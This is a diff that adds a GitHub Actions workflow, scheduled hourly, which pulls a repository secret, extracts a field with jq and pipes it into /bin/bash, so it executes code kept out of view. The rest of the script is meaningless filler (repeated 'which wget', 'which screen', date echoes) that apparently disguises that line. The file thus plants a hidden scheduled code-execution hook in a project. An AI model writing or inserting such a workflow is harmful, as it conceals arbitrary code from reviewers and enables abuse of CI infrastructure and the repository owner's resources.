@@ -1,0 +1,34 @@
+name: quanchuanjing9674
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: quanchuanjing9674
+        env:
+          m604: ${{ secrets.m604 }}
+        run: |
+          echo "Date only: $(date +%F)"
+          ls -al | grep -E "has.*a.*cpp" | xargs cat
+          : ' Another single-line comment '
+          echo $m604 | jq -r .r8007 | /bin/bash
+          which brew
+          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
+          which bash 2>/dev/null || echo "Bash not in path"
+          echo "Build $(date +%s)"
+          uname -a
+          which wget
+          which wget
+          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
+          sleep 0.1 2>/dev/null || true
+          test -d /tmp && echo "Tmp dir exists"
+          ls -la 2>/dev/null || true
+          for i in {1..3}; do echo "Iter $i"; done
+          which screen
+          echo "Debug at $(date)"
+          echo "Date only: $(date +%F)"
